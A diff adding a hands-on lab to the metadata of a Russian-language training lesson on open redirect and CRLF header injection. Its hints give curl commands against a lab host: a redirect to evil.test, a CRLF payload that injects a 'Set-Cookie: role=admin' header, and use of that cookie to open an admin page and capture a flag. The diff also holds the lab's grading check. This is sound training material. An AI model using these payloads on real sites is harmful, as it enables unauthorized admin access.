@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 34
 summary: "Подмена редиректа, вставка переводов строк в заголовки и письма — и как это усиливает XSS и SSRF."
+lab:
+  kind: shell
+  title: "Практика: open redirect → CRLF"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Штатный редирект: `curl -s -i 'http://app.example/redirect?next=/home'`.
+    - Открытый редирект: `curl -s -i 'http://app.example/redirect?next=https://evil.test'`.
+    - Инъекция заголовка через CRLF: `curl -s -i 'http://app.example/redirect?next=%0d%0aSet-Cookie:%20role=admin'`.
+    - Возьми админку с полученной cookie: `curl -s 'http://app.example/admin' -H 'Cookie: role=admin' | tail -1 > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
